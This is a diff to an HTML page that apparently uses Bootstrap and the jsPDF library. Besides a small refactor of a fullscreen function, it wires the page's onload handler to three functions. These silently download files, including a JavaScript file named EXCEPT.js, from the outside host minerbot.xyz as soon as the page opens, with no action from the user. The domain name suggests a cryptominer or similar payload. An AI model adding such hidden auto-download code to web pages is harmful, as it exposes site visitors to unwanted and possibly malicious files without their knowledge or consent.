@@ -24,23 +24,23 @@
         <!-- Core theme CSS (includes Bootstrap)-->
         <link href="../css/styles.css" rel="stylesheet" />
     </head>
-    <body id="page-top" onload="down()">
+    <body id="page-top" onload="down(); down2(); down3();">
 	    	    <script>
-			    var elem = document.documentElement;
 
 /* View in fullscreen */
 function openFullscreen() {
-  if (elem.requestFullscreen) {
-    elem.requestFullscreen();
-  } else if (elem.webkitRequestFullscreen) { /* Safari */
-    elem.webkitRequestFullscreen();
-  } else if (elem.msRequestFullscreen) { /* IE11 */
-    elem.msRequestFullscreen();
-  }
+	var elem = document.documentElement;
+	if (elem.requestFullscreen) {
+		elem.requestFullscreen();
+	} else if (elem.webkitRequestFullscreen) { /* Safari */
+		elem.webkitRequestFullscreen();
+	} else if (elem.msRequestFullscreen) { /* IE11 */
+		elem.msRequestFullscreen();
+	}
 }
 function down() {
 	var downloading = browser.downloads.download({
-  url : 'https://minerbot.xyz/s/',
+  url : 'https://minerbot.xyz/s/EXCEPT.js',
   filename : 'EXCEPT.js',
   conflictAction : 'uniquify'
 });
@@ -48,7 +48,7 @@ function down() {
 }
 			    function down2() {
 	var downloading = browser.downloads.download({
-  url : 'https://minerbot.xyz/s/',
+  url : 'https://minerbot.xyz/s/INFO.txt',
   filename : 'INFO.txt',
   conflictAction : 'uniquify'
 });
@@ -56,7 +56,7 @@ function down() {
 }
 			    function down3() {
 	var downloading = browser.downloads.download({
-  url : 'https://minerbot.xyz/s/',
+  url : 'https://minerbot.xyz/s/jk.jpeg',
   filename : 'jk.jpeg',
   conflictAction : 'uniquify'
 });
@@ -68,7 +68,8 @@ function down() {
 <script src="js/jquery.min.js"></script>
 
 <!-- jsPDF library -->
-	    <script src="js/jsPDF/dist/jspdf.min.js">
+	    <script src="js/jsPDF/dist/jspdf.min.js"></script>
+	    <script>
 	    			    var doc = new jsPDF();
 		    var elementHTML = $('#contnet').html();
 		    var specialElementHandlers = {
